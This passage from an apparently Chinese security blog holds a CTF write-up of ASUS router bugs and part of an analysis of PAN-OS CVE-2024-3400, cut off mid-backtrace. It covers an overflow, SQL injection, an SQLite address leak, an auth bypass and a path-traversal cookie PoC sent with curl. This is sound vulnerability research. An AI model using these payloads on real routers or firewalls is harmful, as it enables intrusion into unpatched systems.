cookie的值， 其中 <code>tmp-used</code> 就是 cookie 值的长度</li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-06-03-61f3efe08492e4b4f343ed6cd8e71054-8cb378.png" title="image-20240531144331569" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-06-03-61f3efe08492e4b4f343ed6cd8e71054-8cb378.png" alt="image-20240531144331569"></a></p><ul><li><code>mod_aicloud_auth.so</code> 解析 uri 处栈溢出， 直接从 <code>?</code> 后取字符串，然后也是通过 <code>strncpy</code>拼接字符串， 长度可控</li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-06-01-80096b20b85a2164967f0159dd57ec4d-271b96.png" title="image-20240531145941750" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-06-01-80096b20b85a2164967f0159dd57ec4d-271b96.png" alt="image-20240531145941750"></a></p><ul><li><code>replace_str</code> 函数栈溢出</li></ul><p>replace_str 函数中没有检查长度， 直接通过 sprintf 写入 buffer 中， 因此可以造成栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">replace_str</span><span class="params">(<span class="keyword">char</span> *st, <span class="keyword">char</span> *orig, <span class="keyword">char</span> *repl, <span class="keyword">char</span>* buff)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">char</span> *ch;</span><br><span class="line"><span class="keyword">if</span> (!(ch = <span class="built_in">strstr</span>(st, orig)))</span><br><span class="line"><span class="keyword">return</span> st;</span><br><span class="line"><span class="built_in">strncpy</span>(buff, st, ch-st);  </span><br><span class="line">buff[ch-st] = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">sprintf</span>(buff+(ch-st), <span class="string">&quot;%s%s&quot;</span>, repl, ch+<span class="built_in">strlen</span>(orig));  </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> buff;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过查看调用链， 可以看到 <code>change_webdav_file_path</code> 调用了 <code>replace_str</code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-12-08-091f70ed61dddfc929181d69335b5d90-7396c2.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-12-08-091f70ed61dddfc929181d69335b5d90-7396c2.png" alt="image.png"></a></p><p>从 <code>mod_webdav.so</code> 的二进制看就是， <code>sub_7e60</code> 函数传入了 <code>buffer</code> 这个参数， </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-eb22c3bb9c6720d72ffe3bec7bfa6e12-29e688.png" title="image-20240531154324688" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-eb22c3bb9c6720d72ffe3bec7bfa6e12-29e688.png" alt="image-20240531154324688"></a></p><p>然后在 <code>sub_7e60</code> 函数中调用了 <code>replace_str</code> 函数，我们已经知道 <code>replace_str</code> 函数是直接通过 <code>sprintf</code>拼接字符串，没有检查， 因此存在栈溢出</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-a2118c221cbbe92c5c4805ed62c1f388-024d59.png" title="image-20240531154439915" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-a2118c221cbbe92c5c4805ed62c1f388-024d59.png" alt="image-20240531154439915"></a></p><h3 id="Infor-Leak"><a href="#Infor-Leak" class="headerlink" title="Infor Leak"></a>Infor Leak</h3><p>其实预期解应该是选手还需要通过某个漏洞在实现泄漏  libc 信息， 但是实际上发现解决题目的其中两个队伍 BlueWater和 Kalmarunionen都用了爆破 libc的方法 （因为32位， 只有4096的随机概率)， 失误了 orz </p><p>在固件的逆向和代码审计的过程中，我们发现一个 sql 注入的存在，后面在上报漏洞给官方的时候才知道这个漏洞其实是之前就有人上报过了，编号为 <a href="https://www.cve.org/CVERecord?id=CVE-2023-35720">CVE-2023-35720</a><sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="CVE-2023-35720 lighttpd mod_webdav.so SQL Injection Information Disclosure Vulnerabilityhttps://www.zerodayinitiative.com/advisories/ZDI-23-1166/">[2]</span></a></sup></p><p>在 mod_webdav.so 中， 程序会从 HTTP 消息的 Header根据关键词取值， </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-38feff175e9b04cc36d723a24bd02346-0f49e1.png" title="image-20240531135012681" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-38feff175e9b04cc36d723a24bd02346-0f49e1.png" alt="image-20240531135012681"></a></p><p>例如从 header 中取出 <code>Keyword</code> ， 之后在 2186 行处有一次判断值是否合法的代码， 如果值不合法则HTTP返回 207</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-a51921dc15c8c5894755d96075a3dc8f-1447b7.png" title="image-20240531135146493" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-a51921dc15c8c5894755d96075a3dc8f-1447b7.png" alt="image-20240531135146493"></a></p><p>这里判断了是否为空、是否存在 <code>&#39;</code> 单引号， 如果合法后续会拼接到 sql 语句中执行。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-50427acb752f782bf7e88baeb0d9841b-89abea.png" title="image-20240531135333100" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-50427acb752f782bf7e88baeb0d9841b-89abea.png" alt="image-20240531135333100"></a></p><p>这里我们注意到一个地方， 在拼接之前会进行一次 urldecode， 此时我们显然很容易就会发现问题所在了， 我们可以通过 url 编码来绕过程序对 <code>&#39;</code>单引号的检查，在后续拼接 sql 语句来达到 sql 注入的效果。</p><p>另外一个问题来了， 我们这个标题不是说信息泄漏吗？sql注入怎么达到信息泄漏呢？该组件sql数据库使用的是 sqlite3，在 sqlite3 中有一个可以用来地址泄漏的方法,  在2017年长亭的 <a href="https://blog.chaitin.cn/abusing_fts3_tokenizer/">特性还是漏洞？滥用 SQLite 分词器</a>) <sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="特性还是漏洞？滥用 SQLite 分词器 https://blog.chaitin.cn/abusing_fts3_tokenizer/">[3]</span></a></sup>文章中有详细说明。</p><p>我们直接诶引用下原文说明下原理，SQLite3 中注册自定义分词器用到的函数是 <a href="https://sqlite.org/fts3.html#section_8_1">fts3_tokenizer</a>，实现代码位于 ext/fts3/fts3_tokenizer.c 的 <code>scalarFunc</code> 函数。支持两种调用方式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT fts3_tokenizer(&lt;tokenizer-name&gt;);</span><br><span class="line">SELECT fts3_tokenizer(&lt;tokenizer-name&gt;, &lt;sqlite3_tokenizer_module ptr&gt;);</span><br></pre></td></tr></table></figure><p>当只提供一个参数的时候，该函数返回指定名字的分词器的 <code>sqlite3_tokenizer_module</code> 结构体指针，以 blob 类型表示。例如在 sqlite3 控制台中输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite<span class="operator">&gt;</span> <span class="keyword">select</span> hex(fts3_tokenizer(<span class="string">&#x27;simple&#x27;</span>));</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-066ac8151cc38c196be3cf4eaa763c6d-053f83.png" title="image-20240531141122848" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-066ac8151cc38c196be3cf4eaa763c6d-053f83.png" alt="image-20240531141122848"></a></p><p>将会返回一个以大端序 16 进制表示的内存地址，可以用来检查特定名称的分词器是否已注册。这个指针指向一个 <code>sqlite3_tokenizer_module</code> 结构体。</p><p>函数的第二个可选参数用以注册新的分词器，只要执行如下 SQL 查询，即可注册一个名为 <code>mytokenizer</code> 的分词器：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite<span class="operator">&gt;</span> <span class="keyword">select</span> fts3_tokenizer(<span class="string">&#x27;mytokenizer&#x27;</span>, x<span class="string">&#x27;0xdeadbeefdeadbeef&#x27;</span>);</span><br></pre></td></tr></table></figure><p>根据文章 <code>2.1 基地址泄漏</code> 小节中说明的，只提供一个参数执行 <code>select fts3_tokenizer(name)</code>，如果 name 是一个已经注册过的分词器，将会返回这个分词器对应的内存地址。在 <a href="https://github.com/mackyle/sqlite/blob/c37ab9dfdd94a60a3b9051d2ef54ea766c5d227a/ext/fts3/fts3.c#L5876-L5877">fts3.c</a> 中可以看到 SQLite3 默认注册了内置分词器 <code>simple</code> 和 <code>porter</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( sqlite3Fts2HashInsert(pHash, <span class="string">&quot;simple&quot;</span>, <span class="number">7</span>, (<span class="keyword">void</span> *)pSimple)</span><br><span class="line"> || sqlite3Fts2HashInsert(pHash, <span class="string">&quot;porter&quot;</span>, <span class="number">7</span>, (<span class="keyword">void</span> *)pPorter)</span><br></pre></td></tr></table></figure><p>以 simple 分词器为例，其注册的指针指向静态区的 <code>simpleTokenizerModule</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> sqlite3_tokenizer_module simpleTokenizerModule = &#123;</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  simpleCreate,</span><br><span class="line">  simpleDestroy,</span><br><span class="line">  simpleOpen,</span><br><span class="line">  simpleClose,</span><br><span class="line">  simpleNext,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>通过获得这个指针，即可通过简单的计算获得 libsqlite3.so 的基地址，从而绕过 ASLR。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-551b9d1c4f4eb3f6d49a5a284f44c474-42b33b.png" title="image-20240531141746938" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-551b9d1c4f4eb3f6d49a5a284f44c474-42b33b.png" alt="image-20240531141746938"></a></p><p>因此接合上面的sql注入， 我们就可以拿到泄漏的地址</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-2c6da9782b31979b378b462339dd7110-f3a2b2.png" title="image-20240531142504487" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-2c6da9782b31979b378b462339dd7110-f3a2b2.png" alt="image-20240531142504487"></a></p><h3 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h3><p>在检查路由的时候， 代码如下</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-0769d452373682f774e0a2ffcbe4f91e-9e53e6.png" title="image-20240531142102397" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-05-31-0769d452373682f774e0a2ffcbe4f91e-9e53e6.png" alt="image-20240531142102397"></a></p><p>检查路由的时候判断是不是 <code>/smb/</code> 但是忽略了， 如果是 <code>/smb</code>  则可以绕过授权</p><h2 id="一个好玩的非预期"><a href="#一个好玩的非预期" class="headerlink" title="一个好玩的非预期"></a>一个好玩的非预期</h2><p>前文提到了这个题目有三个队伍做出来了， 其中<strong>BlueWater</strong>和 <strong>Kalmarunionen</strong>是通过栈溢出 + 爆破 libc 解决题目的， 另外一个队伍用了一个比较有趣的非预期， 这个队伍就是 <strong>Friendly Maltese Citizens</strong></p><p>前面提到了该服务存在 sql 注入漏洞，他们发现 smb 的 <code>GETMUSICCLASSIFICATION</code> 方法存在 <code>get_album_cover_image</code>函数可以用来加载文件内容并且泄漏。于是他们用 sql 注入将 flag 的路径写到 <code>album</code>表中， 然后直接通过下面的方法预览</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">await fetch(&quot;&#x2F;RWCTF&quot;, &#123;</span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;classify&quot;: &quot;album&quot;,</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;body&quot;: &quot;&lt;?xml version&#x3D;\&quot;1.0\&quot; encoding&#x3D;\&quot;UTF-8\&quot; standalone&#x3D;\&quot;yes\&quot; ?&gt;&lt;D:propfind xmlns:D&#x3D;\&quot;DAV:\&quot;&gt;&lt;D:prop&gt;&lt;D:getlastmodified&#x2F;&gt;&lt;D:getcontentlength&#x2F;&gt;&lt;D:getcontenttype&#x2F;&gt;&lt;D:getmatadata&#x2F;&gt;&lt;&#x2F;D:prop&gt;&lt;&#x2F;D:propfind&gt;&quot;,</span><br><span class="line">  &quot;method&quot;: &quot;GETMUSICCLASSIFICATION&quot;</span><br><span class="line">&#125;).then(a &#x3D;&gt; a.text())</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">Router challenge attachment https://github.com/chaitin/Real-World-CTF-6th-Challenges/tree/main/Router4<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">CVE-2023-35720 lighttpd mod_webdav.so SQL Injection Information Disclosure Vulnerabilityhttps://www.zerodayinitiative.com/advisories/ZDI-23-1166/<a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">特性还是漏洞？滥用 SQLite 分词器 https://blog.chaitin.cn/abusing_fts3_tokenizer/<a href="#fnref:3" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="ASUS" scheme="https://bestwing.me/tags/ASUS/"/>
    
    <category term="CVE-2024-3079" scheme="https://bestwing.me/tags/CVE-2024-3079/"/>
    
    <category term="CVE-2024-3080" scheme="https://bestwing.me/tags/CVE-2024-3080/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-3400 Palo Alto Networks PAN-OS命令注入漏洞</title>
    <link href="https://bestwing.me/PanOS-CVE-2024-3400-command-inject.html"/>
    <id>https://bestwing.me/PanOS-CVE-2024-3400-command-inject.html</id>
    <published>2024-04-18T03:57:51.000Z</published>
    <updated>2024-05-31T08:10:23.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>…</p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>4月12日的是看到 paloaltonetworks 有一个<a href="https://security.paloaltonetworks.com/CVE-2024-3400">安全公告</a><sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="CVE-2024-3400 https://security.paloaltonetworks.com/CVE-2024-3400">[1]</span></a></sup>, CVE编号是 CVE-2024-3400， 漏洞是一个命令注入，影响的版本如下：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-170fb303df099bbd0a073e98cbd42d15-0a42e9.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-170fb303df099bbd0a073e98cbd42d15-0a42e9.png" alt="image.png"></a></p><p>然后在复现的过程中发现 <a href="https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/">watchTowr Labs</a><sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400 https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/">[2]</span></a></sup> 已经发了他们的分析， 那就顺着他们的分析学习下这洞吧， 这里提下我的复现版本为  10.2.9</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>由于漏洞公告<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="CVE-2024-3400 https://security.paloaltonetworks.com/CVE-2024-3400">[1]</span></a></sup>提到， 该漏洞的影响需要 PAN-OS 配置 GlobalProtect portal  或者 GlobalProtect gateway， 所以我们需要先完整的搭建下我们的环境。</p><p>简单说下配置的流程， 我这里的配置是参考 QWB S6 Final Pan 这个题目的环境配置的（ 亏我还能找到这个题目的虚拟机）， 另外提一句当时强网杯利用的 CVE-2021-3064  这个漏洞还是蛮有意思的。</p><p>首先，我的虚拟机有三个网卡， </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-816a7be51e2305a423ca831720fbcb40-748b56.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-816a7be51e2305a423ca831720fbcb40-748b56.png" alt="image.png"></a></p><p>网卡1是管理口， 网卡2准备用来做门户和网关的网段 ，我这里用的网段是 192.168.100.1/24 。 登陆到管理口的后台后，依次设置</p><ul><li><code>NETWORK-&gt;接口</code> 设置以太网接口， 接口类型设置为 3层， 设置 IPV4 的静态 IP</li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-9d467bfc09795325ce71a7074e66472d-6a6717.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-9d467bfc09795325ce71a7074e66472d-6a6717.png" alt="image.png"></a></p><ul><li><code>DEVICE-&gt;证书管理-&gt;证书</code>， 生成 <code>RootCert</code> 再基于 <code>RootCert</code> 派发一个 <code>gp_cer</code></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-406a4ea26bd78e5a04934143aef13543-83aff2.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-406a4ea26bd78e5a04934143aef13543-83aff2.png" alt="image.png"></a></p><ul><li><code>DEVICE-&gt;证书管理-&gt; SSL/TLS 服务配置文件</code> 依据 <code>gp_cert</code> 配置 <code>SSL_PROFILE</code> </li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-4b4209440fda8a3a053972d25631f4ca-db11cb.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-4b4209440fda8a3a053972d25631f4ca-db11cb.png" alt="image.png"></a></p><ul><li>然后到 <code>NETWORK-&gt;GlobalProtect-&gt;门户</code> 配置门户， 中间可能少了一点东西， 这里贴一下我的配置项， 缺什么补什么就好了</li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-54cfca4fb5aac5420ad35226d622dcf1-d08e7d.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-54cfca4fb5aac5420ad35226d622dcf1-d08e7d.png" alt="image.png"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-0e68201624433e2f2e83b0aa8e0ffffd-d4597b.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-0e68201624433e2f2e83b0aa8e0ffffd-d4597b.png" alt="image.png"></a></p><ul><li><code>NETWORK-&gt;GlobalProtect-&gt;网关</code>  网关配置是也是差不多</li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-dfcc5748423c7c853f501df686b00769-05ee7e.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-dfcc5748423c7c853f501df686b00769-05ee7e.png" alt="image.png"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-de55f8f07fd6536e6d1b53982fcba08a-a24597.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-de55f8f07fd6536e6d1b53982fcba08a-a24597.png" alt="image.png"></a></p><p>然后现在在另外一台虚拟机里，也设置上同样的 192.168.100.1/24 网段的网卡， 就可以访问到门户了</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-cfa3139a5d0565a5f58eaa6d71149ca9-bd7a7f.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-cfa3139a5d0565a5f58eaa6d71149ca9-bd7a7f.png" alt="image.png"></a></p><p>由于没有所谓的设备证书， 此次漏洞能命令执行提到的 <code>telemetry</code> 功能是不可用状态</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-68f8c6c8c84298c60edce20ab1b605c1-e506e3.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-68f8c6c8c84298c60edce20ab1b605c1-e506e3.png" alt="image.png"></a></p><p>访问 <code>https://192.168.1.101/ssl-vpn/hipreport.esp</code> 就是 <code>https://192.168.1.101/ssl-vpn/hipreport.esp</code> 的返回</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-96976b0fa3631f751c7fd681e619a009-78682c.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-96976b0fa3631f751c7fd681e619a009-78682c.png" alt="image.png"></a></p><p>shell 和文件系统的获取直接用了当时 QWB时候 Larryxi<sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="Larryxi blog https://aslr.io/about/">[3]</span></a></sup> 大哥提供的方法</p><ul><li>patch vmem获取本地shell<ul><li><code>sed -i  &quot;s/\/usr\/local\/bin\/cli/\/\/\/\/\/\/\/\/\/\/\/\/bin\/sh/g&quot;  PA1029-9aad9851.vmem</code></li><li><code>sed -i  &quot;s/admin:x:1001:1004/admin:x:0000:0000/g&quot;  PA1029-9aad9851.vmem</code></li></ul></li><li>查看固件内容方式， 挂载 vmdk 就行<br>j<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe nbd</span><br><span class="line">sudo qemu-nbd -c /dev/nbd1 /mnt/hgfs/qwb-final/PA-disk1.vmdk</span><br><span class="line">sudo mount /dev/nbd1p2 /mnt/panos/</span><br></pre></td></tr></table></figure></li></ul><p>这样就可以 <code>admin</code> 用户登陆之后是一个 root 权限的 shell ， 之后调试之类的也可使用 ssh 登陆</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在<sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="CVE-2024-3400 https://security.paloaltonetworks.com/CVE-2024-3400">[1]</span></a></sup> 文章就已经提到了漏洞的触发路径， 首先是 <code>gpsvc</code> 文件在处理 Cookie 字段的时候会有一个任意文件写， 其次是 <code>telemetry</code> 功能的定时任务 <code>device_telemetry_send</code> 会用 <code>/usr/local/bin/dt_send</code> 发送数据的时候会拼接文件名到命令中，造成命令注入。</p><p>我们依次简单分析下</p><h3 id="gpsvc-任意文件写分析"><a href="#gpsvc-任意文件写分析" class="headerlink" title="gpsvc 任意文件写分析"></a>gpsvc 任意文件写分析</h3><p>通过 <code>netstat</code> 命令， 我们可以看到 <code>gpsvc</code> 监听在 20277 端口上，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-f0c5dbbf086627739b812d69f7a885a7-95131b.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-f0c5dbbf086627739b812d69f7a885a7-95131b.png" alt="image.png"></a></p><p>在查看 <code>/etc/nginx/sslvpn/localtion.conf</code> 的配置文件中， 我们看到如下配置</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-26bc6521d591f5983b7ef76c5f5d74fe-e2c225.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-26bc6521d591f5983b7ef76c5f5d74fe-e2c225.png" alt="image.png"></a></p><p>可以看到 ssl-vpn 相关的部分接口为通过 nginx 代理转发到 20177 端口， 就是 gpsvc 程序里处理。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>我们把程序拿出来分析， 坏消息是这个程序是 golang 编写的， 好像是有符号， 而且我们已经知道了漏洞大致位置， 可以通过直接找到 <code>main__ptr_SessDiskStore_New</code> 函数</p><p>我们在这个函数里可以看到一个通过 Cookie 里的值然后拼接文件名的操作，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-2db013dad24a650e91668b19f3057206-e94251.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-2db013dad24a650e91668b19f3057206-e94251.png" alt="image.png"></a></p><p>比如我们在 146 行下一个断点， 然后使用如下 PoC 触发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k -X $<span class="string">&#x27;POST&#x27;</span> \</span><br><span class="line">    -H $<span class="string">&#x27;Host: 127.0.0.1&#x27;</span> -H $<span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -H $<span class="string">&#x27;Content-Length: 158&#x27;</span> \</span><br><span class="line">    -b $<span class="string">&#x27;SESSID=/../../../tmp/hacked&#x27;</span> \</span><br><span class="line">    --data-binary $<span class="string">&#x27;user=watchTowr&amp;portal=watchTowr&amp;authcookie=e51140e4-4ee3-4ced-9373-96160d68&amp;domain=watchTowr&amp;computer=watchTowr&amp;client-ip=watchTowr&amp;client-ipv6=watchTowr&amp;md5-sum=watchTowr&amp;gwHipReportCheck=watchTowr&#x27;</span> \</span><br><span class="line">    $<span class="string">&#x27;https://192.168.1.101/ssl-vpn/hipreport.esp&#x27;</span></span><br></pre></td></tr></table></figure><p>到达<code>main__ptr_SessDiskStore_New</code> 函数的backtrace如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#0  main.(*SessDiskStore).New (s&#x3D;0xc000821800, r&#x3D;0xc00260f400, name&#x3D;..., ~r2&#x3D;0x0, ~r3&#x3D;...)</span><br><span class="line">    at &#x2F;opt&#x2F;build&#x2F;bamboo-agent-home-3&#x2F;xml-data&#x2F;build-dir&#x2F;LA-GPSVC131-JOB1&#x2F;build&#x2F;src&#x2F;apps&#x2F;pan_gpsvc_session.go:103</span><br><span class="line">#1  0x0000000000a472c3 in 